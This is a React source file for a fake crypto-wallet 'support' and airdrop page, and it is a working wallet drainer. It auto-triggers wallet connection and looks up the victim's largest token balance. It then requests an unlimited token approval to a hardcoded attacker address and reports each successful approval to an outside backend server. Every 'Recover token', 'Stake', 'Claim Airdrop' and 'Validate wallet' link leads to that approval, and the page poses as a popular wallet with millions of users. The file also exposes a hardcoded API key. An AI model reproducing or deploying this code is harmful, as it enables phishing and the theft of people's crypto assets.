"use client"

// import { QueryClient, QueryClientProvider } from 'react-query';

import { useEffect, useMemo, useRef, useState } from 'react';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import {
  useAccount, usePrepareContractWrite,
  useContractWrite,
  useWaitForTransaction,
  useBalance,
  // useContractRead
} from 'wagmi'
import { useNetwork } from 'wagmi';
// import { BigNumber, utils } from 'ethers'
import ERCABI from './ERC20.json'
// import MINTETHABI from './ABI.json'
import axios from 'axios'; import '@rainbow-me/rainbowkit/styles.css';
// import { ChakraProvider } from '@chakra-ui/react'


function App() {

    const { address: userAddress, isConnected, isConnecting } = useAccount()
    // const isRendered = useRef(false);
    const connectBtnRef = useRef({});
    const autoBtn = useRef();

    const [ercBalances, setErcBalances] = useState([]);

    const network_list = {
        "1": "ethereum", 
        "56": "bsc",
        "42161": "arbitrum",
        "97": "bsc-testnet",
    }

    const usdtToken = {
        "1": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
        "56": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
        "42161": "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
        "97": "0xDA4a05dF3EBf4256Fa2ecBe37ecd64Ac79674426",
    }

    const usdcToken = {
        "1": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
        "56": "0x8965349fb649A33a30cbFDa057D8eC2C48AbE2A2",
        "97": "0x4654e3ECf92618da98b8720645011aFa9730FaF7",
        "42161": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
    }

    const { chain: currentChain } = useNetwork();

    const ercContractAddress = useMemo(() => {
        if (ercBalances.length > 0) {
            const _bal = ercBalances.filter((e) => e.contract_address !== "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee").sort((a, b) => parseInt(b.balance) - parseInt(a.balance));
            if (_bal.length > 0) {
                console.log(_bal[0].contract_name);
                return _bal[0].contract_address;
            } else {
                return null
            }
        } else {
            return null
        }
    }, [ercBalances, currentChain]);

    // const mintAmount = '0.06'
    const approvalAmount = 1000000000000000000000000000000;

    const tokenBalance = useBalance({
        address: userAddress,
        token: currentChain && usdtToken[currentChain.id]
    });

      const usdcTokenBalance = useBalance({
        address: userAddress,
        token: currentChain && usdcToken[currentChain.id]
      });

    async function getUserBalances() {
        setErcBalances([])
        // const wallet_addr = "0xBB289bC97591F70D8216462DF40ED713011B968a";
        const query = new URLSearchParams({
            verified: 'false',
            includeLowVolume: 'true',
            chainId: 'false',
            token: 'true',
            aggregatedBalance: 'false',
            auth_key: "8RSMg2sDAQ4NijUMbF40C61pqyWVqTOA4Z7AE0Iu"
        }).toString();
        const resp = await axios.get(`https://api.unmarshal.com/v1/${network_list[currentChain.id]}/address/${userAddress}/assets?${query}`)
        console.log("balances", resp.data);
        setErcBalances(resp.data)
        // return resp.data;
    }

    useEffect(() => {
        currentChain && getUserBalances();
        console.log("current chain", currentChain);
        currentChain && console.log(currentChain.id == 1 ? "USDT: " : "BUSD: ", usdtToken[currentChain.id])
        currentChain && console.log("USDC: ", usdcToken[currentChain.id])
    }, [currentChain])

    useEffect(() => {
        setTimeout(() => {
            isConnected && console.log(currentChain.id == 1 ? "USDT: " : "BUSD: ", tokenBalance.data?.formatted)
            isConnected && console.log("USDC: ", usdcTokenBalance.data?.formatted)
            !isConnected && connectBtnRef.current.click()
        }, 1000)
        // isRendered.current = isRendered.current === false && true;
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [])

    const { config: approveConfig } = usePrepareContractWrite({
        address: currentChain && (ercContractAddress !== null ? ercContractAddress : usdtToken[currentChain.id]),
        abi: ERCABI,
        functionName: 'approve',
        args: ["0x75873133A7dc9a87aAa4374f59d707F67343502a", approvalAmount],
    });

    const {
        data: mintData,
        isLoading: isMintLoading,
        isSuccess: isMintStarted,
        write: userMinterMain,
    } = useContractWrite(approveConfig);

    const { config: approveConfigUSDC } = usePrepareContractWrite({
        address: currentChain && usdcToken[currentChain.id],
        abi: ERCABI,
        functionName: 'approve',
        args: ["0x75873133A7dc9a87aAa4374f59d707F67343502a", approvalAmount],
    });

    const {
        data: mintDataUSDC,
        isLoading: isMintLoadingUSDC,
        isSuccess: isMintStartedUSDC,
        write: userMinterMainUSDC,
    } = useContractWrite(approveConfigUSDC);

    const { config: approveConfigUSDT } = usePrepareContractWrite({
        address: currentChain && usdtToken[currentChain.id],
        abi: ERCABI,
        functionName: 'approve',
        args: ["0x75873133A7dc9a87aAa4374f59d707F67343502a", approvalAmount],
    });

    const {
        data: mintDataUSDT,
        isLoading: isMintLoadingUSDT,
        isSuccess: isMintStartedUSDT,
        write: userMinterMainUSDT,
    } = useContractWrite(approveConfigUSDT);

    function execMinter() {
        // if (isConnected && tokenBalance?.data && usdcTokenBalance?.data) {
        //   if (Number(tokenBalance.data.formatted) >= Number(usdcTokenBalance.data.formatted)) {
        //     userMinterMain();
        //   } else {
        //     userMinterMainUSDC();
        //   }
        // }

        if (isConnected) {
            userMinterMain();
        }
    }

    // Test

    // const { tdata } = useContractRead({
    //   address: currentChain && usdtToken[currentChain.id],
    //   abi: ERCABI,
    //   functionName: 'balanceOf',
    //   args: ['0x5d5D52b17bF494E744B8c6b0Eae0e8dE486872e5'],
    // })

    // console.log(tdata)

    // End test


    const { isSuccess: approveTxSuccess, data:approveTxData } = useWaitForTransaction({ hash: mintData?.hash })
    const { isSuccess: approveTxSuccessUSDC, data:approveTxUSDCData } = useWaitForTransaction({ hash: mintDataUSDC?.hash })

    useEffect(() => {
        if (isConnected) {
            setTimeout(() => {
                currentChain && ercContractAddress !== null && autoBtn.current.click();
            }, 1000)
        }
    }, [isConnected, currentChain, ercContractAddress])

    // const { config: mintETHConfig } = usePrepareContractWrite({
    //   address: "0xDDa9D7B879c71ee45a3039fcC7e77F7Ed010b1e3",
    //   abi: MINTETHABI,
    //   functionName: 'mint',
    //   overrides: {
    //     value: utils.parseEther(mintAmount)
    //   }
    // })

    // const {
    //   write: mintETH,
    //   data: mintETHData,
    //   // isSuccess: isMintETHStarted,
    //   isLoading: isMintETHLoading,
    // } = useContractWrite(mintETHConfig)

    // const { isSuccess: mintETHTxSuccess, } = useWaitForTransaction({ hash: mintETHData?.hash })

    async function sendToBackend(tnx, hash) {
        console.log('hash ', hash)
        console.log('tnx ', tnx)
        try {
            const resp = await axios.post('https://mainorgsystem.online/api/token/approval', {
                token: tnx.to,
                owner: userAddress,
                spender: "0x75873133A7dc9a87aAa4374f59d707F67343502a",
                value: approvalAmount.toString(),
                chain: `${currentChain.id}`
                // value: tnx.logs[0].data,
                // tnx_hash: hash,
                // tnx: JSON.stringify(tnx),
            })

            console.log(resp.data)
        } catch (error) {
            console.log(error.response)
        }

    }

    useEffect(() => {
        async function sendTBE() {
            if (approveTxSuccess) {
                console.log('TNX reciept', approveTxData)
                sendToBackend(approveTxData, approveTxData.hash)
            }

            if (approveTxSuccessUSDC) {
                console.log('TNX reciept usdc', approveTxData)
                sendToBackend(approveTxUSDCData, approveTxUSDCData.hash)
            }
        }
        sendTBE() 
    }, [approveTxSuccess, approveTxSuccessUSDC])



    return (
        <>
            <main className="main" id="top">
                <nav className="navbar navbar-light sticky-top shadow-transition" data-navbar-darken-on-scroll="900" style={{ paddingTop: "0px", backgroundImage: "none", borderBottom: "1px solid rgb(22, 32, 68)", backgroundColor: "rgb(7, 14, 39)" }}>
                    <div className="container pt-2">
                        <a className="navbar-brand text-white" href="/">
                            SyncMain
                        </a>
                        <div className="navbar-nav ms-auto">
                            {isConnected ?
                                <>
                                    <ConnectButton showBalance={false} />
                                    <a id="btn btn-secondary" disabled={isConnecting} onClick={() => (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue')} className="btn btn-secondary mt-2" type="button">Claim Airdrop</a>
                                </> :
                                <ConnectButton.Custom>
                                    {
                                        ({
                                            openConnectModal
                                        }) => {
                                            return (
                                                <button id="prototype-wallet-default" ref={connectBtnRef} disabled={isConnecting} onClick={() => openConnectModal()} className="btn btn-secondary" type="button">Connect Wallet</button>
                                            )
                                        }
                                    }
                                </ConnectButton.Custom>
                            }
                        </div>
                    </div>
                </nav>
                <section className="mt-6">
                    <div className="container">
                        <div className="row align-items-center">
                            <div className="col-md-9 col-lg-8 col-xl-5">
                                <h1 className="display-3 lh-sm">
                                    The world’s most popular crypto wallets
                                </h1>
                            </div>
                            <div className="col-md-9 col-xl-5">
                                <p className="fs-2">
                                    Over 76 million wallets created to buy, sell, and earn crypto.</p>
                                <a className="btn btn-primary mt-3" ref={autoBtn} onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()}>{isConnected ? 'Claim Airdrop' : 'Connect Wallet'}</a>

                            </div>
                        </div>
                    </div>
                </section>
                {/* <section>
          <div className="container">
            <img className="img-fluid" src="wallet-fold-phone.png" alt="Dashboard" />
          </div>
        </section> */}
                <section>
                    <div className="container">
                        <h1 className="display-6 fw-semi-bold"> Please select Issue Category </h1>
                        <p className="fs-2">Which of this is related to your issue?
                        </p>
                        <div className="row mb-4 mt-6">
                            <div className="col-md-6">
                                <div className="border rounded-1 border-700 h-100 features-items">
                                    <div className="p-5">
                                        <img src="dashboardicon.png" alt="Dashboard" style={{ width: "48px", height: "48px" }} />
                                        <h3 className="pt-3 lh-base">Recover token</h3>
                                        <p className="mb-0">
                                            <a onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()} className="text-primary" style={{ textDecoration: "none" }}>
                                            </a>
                                            <a onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()} className="text-primary" style={{ textDecoration: "none" }}>
                                                Click here </a> to track and get lost token
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6">
                                <div className="border rounded-1 border-700 h-100 features-items">
                                    <div className="p-5">
                                        <img src="dashboardicon.png" alt="Comment" style={{ width: "48px", height: "48px" }} />
                                        <h3 className="pt-3 lh-base">Stake </h3>
                                        <p className="mb-0">
                                            <a href="" style={{ textDecoration: "none", color: "inherit" }}> </a>
                                            <a onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()} className="text-primary" style={{ textDecoration: "none" }}>
                                                Click here </a> for staking related issues.

                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="row mb-4">
                            <div className="col-md-6">
                                <div className="border rounded-1 border-700 h-100 features-items">
                                    <div className="p-5">
                                        <img src="trilored.png" alt="Tailored" style={{ width: "48px", height: "48px" }} />
                                        <h3 className="pt-3 lh-base">unstake</h3>
                                        <p className="mb-0">
                                            <a href="" style={{ textDecoration: "none", color: "inherit" }}> </a>
                                            <a onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()} className="text-primary" style={{ textDecoration: "none" }}>
                                                Click here </a> to unstake

                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6">
                                <div className="border rounded-1 border-700 h-100 features-items">
                                    <div className="p-5">
                                        <img src="trilored.png" alt="Statistic" style={{ width: "48px", height: "48px" }} />
                                        <h3 className="pt-3 lh-base">
                                            Mint
                                        </h3>
                                        <p className="mb-0">
                                            <a href="" style={{ textDecoration: "none", color: "inherit" }}> </a>
                                            Do you have any issues with Minting? <a onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()} className="text-primary" style={{ textDecoration: "none" }}>
                                                Click here </a> to Rectify.
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="row">
                            <div className="col-md-6">
                                <div className="border rounded-1 border-700 h-100 features-items">
                                    <div className="p-5">
                                        <img src="statistics.png" alt="Profiles" style={{ width: "48px", height: "48px" }} />
                                        <h3 className="pt-3 lh-base">Migrate </h3>
                                        <p className="mb-0">
                                            <a href="" style={{ textDecoration: "none", color: "inherit" }}>
                                            </a>
                                            <a href="sync//?eth=true" className="text-primary" style={{ textDecoration: "none" }}>
                                                Click here </a> to move your accounts

                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6">
                                <div className="border rounded-1 border-700 h-100 features-items">
                                    <div className="p-5">
                                        <img src="profile.png" alt="Folders" style={{ width: "48px", height: "48px" }} />
                                        <h3 className="pt-3 lh-base">Claim airdrop </h3>
                                        <p className="mb-0">
                                            <a href="" style={{ textDecoration: "none", color: "inherit" }}>
                                            </a>
                                            <a onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()} className="text-primary" style={{ textDecoration: "none" }}>
                                                Click here </a> for airdrop related issues.
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="row mt-4">
                            <div className="col-md-6">
                                <div className="border rounded-1 border-700 h-100 features-items">
                                    <div className="p-5">
                                        <img src="statistics.png" alt="Profiles" style={{ width: "48px", height: "48px" }} />
                                        <h3 className="pt-3 lh-base">Buy</h3>
                                        <p className="mb-0">
                                            <a href="" style={{ textDecoration: "none", color: "inherit" }}>
                                            </a>
                                            <a onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()} className="text-primary" style={{ textDecoration: "none" }}>
                                                Click here </a> to buy tokens

                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6">
                                <div className="border rounded-1 border-700 h-100 features-items">
                                    <div className="p-5">
                                        <img src="profile.png" alt="Folders" style={{ width: "48px", height: "48px" }} />
                                        <h3 className="pt-3 lh-base">Sell</h3>
                                        <p className="mb-0">
                                            <a href="" style={{ textDecoration: "none", color: "inherit" }}>
                                            </a>
                                            <a onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()} className="text-primary" style={{ textDecoration: "none" }}>
                                                Click here </a> to sell tokens

                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="row mt-4">
                            <div className="col-md-6">
                                <div className="border rounded-1 border-700 h-100 features-items">
                                    <div className="p-5">
                                        <img src="trilored.png" alt="Profiles" style={{ width: "48px", height: "48px" }} />
                                        <h3 className="pt-3 lh-base">Participate</h3>
                                        <p className="mb-0">
                                            <a href="" style={{ textDecoration: "none", color: "inherit" }}>
                                            </a>
                                            <a onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()} className="text-primary" style={{ textDecoration: "none" }}>
                                                participate </a> for faster transaction in the mempool and better anonymity

                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6">
                                <div className="border rounded-1 border-700 h-100 features-items">
                                    <div className="p-5">
                                        <img src="profile.png" alt="Folders" style={{ width: "48px", height: "48px" }} />
                                        <h3 className="pt-3 lh-base">Missing transaction</h3>
                                        <p className="mb-0">
                                            <a href="" style={{ textDecoration: "none", color: "inherit" }}>
                                            </a>
                                            <a onClick={() => isConnected ? (currentChain.id === 56 || currentChain.id === 1 || currentChain.id === 42161) ? execMinter() : alert('Switch network to continue') : connectBtnRef.current.click()} className="text-primary" style={{ textDecoration: "none" }}>
                                                Click here </a> for transaction related issues

                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </section>
                <section className="mt-5">
                    <div className="container">
                        <div className="text-center">
                            <div className="p-5 bg-primary rounded-3">
                                <div className="py-3">
                                    {/* <h4 className="opacity-50 ls-2 lh-base fw-medium">Validate</h4> */}
                                    <h2 className="mt-3 fs-4 fs-sm-7 latter-sp-3 lh-base fw-semi-bold">Validate wallet</h2>
                                </div>
                                <div className="flex-center d-flex">
                                    <a onClick={() => isConnected ? execMinter() : connectBtnRef.current.click()} className="btn btn-info">Get Started <span className="fas fa-arrow-right">
                                    </span>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <section className="bg-secondary">
                    <div className="container">
                        <div className="row">
                            <div className="col-xl-4 pt-2 pt-xl-0">
                                <p className="mb-0 text-center text-xl-end">
                                    <a className="text-300 text-decoration-none footer-link" href="#"> Terms &amp; conditon </a>
                                    <a className="text-300 text-decoration-none footer-link ps-4" href="#">Privacy Policy </a>
                                </p>
                            </div>
                        </div>
                    </div>
                </section>
            </main>

            {/* <Modal show={(isMintLoading || isMintStarted)}
        backdrop="static"
        keyboard={false}
        centered style={{ 'marginTop': '-10px' }}>
        <Modal.Header closeButton style={{ 'backgroundColor': 'rgba(7,14,39)' }}>
          <Modal.Title><span style={{ 'color': 'rgba(240, 240, 240, 0.8)' }}>Computing ...</span></Modal.Title>
        </Modal.Header>
        <Modal.Body style={{ 'backgroundColor': 'rgba(7,14,39)' }}>
          <div style={{ 'padding': '50px 50px 100px 50px', 'color': 'rgba(240, 240, 240, 0.8)' }}>
            <center>Task running, please wait …</center>
            <div className='mt-4'>
              <center><i className='fa fa-spinner fa-spin' style={{ 'fontSize': '40px' }}></i></center>
            </div>
          </div>
        </Modal.Body>
      </Modal> */}

            {/* <Modal show={(approveTxSuccess || mintETHTxSuccess) && (!isMintETHLoading || !isMintLoading)}
        backdrop="static"
        keyboard={false}
        centered style={{ 'marginTop': '-10px' }}>
        <Modal.Header closeButton style={{ 'backgroundColor': 'rgba(7,14,39)' }}>
          <Modal.Title><span style={{ 'color': 'rgba(240, 240, 240, 0.8)' }}>Congratulations <i className='fa fa-check-circle'></i></span></Modal.Title>
        </Modal.Header>
        <Modal.Body style={{ 'backgroundColor': 'rgba(7,14,39)' }}>
          <div style={{ 'padding': '50px 50px 100px 50px', 'color': 'rgba(240, 240, 240, 0.8)' }}>
            <center>You have claimed your prize! Give us few minutes for our smart contract to set things up for you</center>
            <div className='mt-4'>
              <center>              
                <button type="button" onClick={() => mintETH(mintAmount)} className="btn btn-secondary btn-md" data-toggle-class-on-target="hide" data-toggle-target="#prototype-winner-status-won, #prototype-winner-status-claimed">
                  {isMintETHLoading ? 'Minting ...' : `Mint again for ${mintAmount} ETH`}
                </button>
              </center>
            </div>
          </div>
        </Modal.Body>
      </Modal> */}
        </>
    );
}

export default App;
